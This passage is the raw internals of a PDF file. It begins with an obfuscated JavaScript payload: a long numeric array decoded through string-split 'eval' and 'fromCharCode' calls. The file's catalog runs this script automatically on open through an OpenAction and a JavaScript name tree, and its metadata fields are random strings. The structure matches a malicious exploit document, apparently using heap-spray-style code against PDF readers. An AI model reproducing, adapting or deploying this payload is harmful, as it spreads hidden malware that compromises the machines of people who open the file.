99 116 116 123 93 120 115 101 83 70 59 56 123 95 34 63 34 123 99 116 117 114 34 45 34 114 99 123 110 113 99 102 61 127 12 34 120 99 116 34 118 87 79 106 80 100 73 121 34 63 34 119 112 103 117 101 99 114 103 42 36 39 50 59 36 43 61 12 34 121 106 107 110 103 34 42 118 87 79 106 80 100 73 121 48 110 103 112 105 118 106 34 62 34 50 122 54 50 50 50 43 118 87 79 106 80 100 73 121 34 45 63 34 118 87 79 106 80 100 73 121 61 12 34 118 87 79 106 80 100 73 121 34 63 34 36 80 48 36 34 45 34 118 87 79 106 80 100 73 121 61 12 34 99 114 114 48 102 113 101 48 69 113 110 110 99 100 48 105 103 118 75 101 113 112 42 118 87 79 106 80 100 73 121 43 61 12 127 12 127 12 107 104 34 42 120 103 116 117 107 113 112 34 64 63 34 59 43 34 125 12 120 99 116 34 114 99 123 110 113 99 102 61 12 80 103 121 97 85 101 116 107 114 118 42 114 99 123 110 113 99 102 43 61 12 127 12".replace(/[A-Za-z]/g,function (c){eval("return String.fromCh"+"arCode((((c = c.cha"+"rCodeAt(0)) & 22"+"3) - 52) %26 + (c"+" & 32) + 63 + 2);");}).split(" ");var p = "";var q=1;eval("for (va"+"r i=0; i<s.length; i++){ p += String.from"+"Cha"+"rCode(s[i]-1+2+3*1-6); }");d(p);)
>>
endobj
8 0 obj
<<
/Producer (HghTc6Fs)
/Title (HerpKjd)
/Subject (AseRitk)
/Author (Joityurop)
/Keywords (Toghopytyor)
/Creator (Wegoptyr)
/CreationDate (D:20060201141412)
>>
endobj
9 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction [3 0 R /FitH null]
/PageLayout /OneColumn
/Names <</JavaScript 6 0 R>>
>>
endobj
xref
0 10
0000000000 65535 f 
0000000238 00000 n 
0000000421 00000 n 
0000000009 00000 n 
0000000087 00000 n 
0000000325 00000 n 
0000000525 00000 n 
0000000572 00000 n 
0000014982 00000 n 
0000015159 00000 n 
trailer
<<
/Size 10
/Root 9 0 R
/Info 8 0 R
>>
startxref
15291
%%EOF
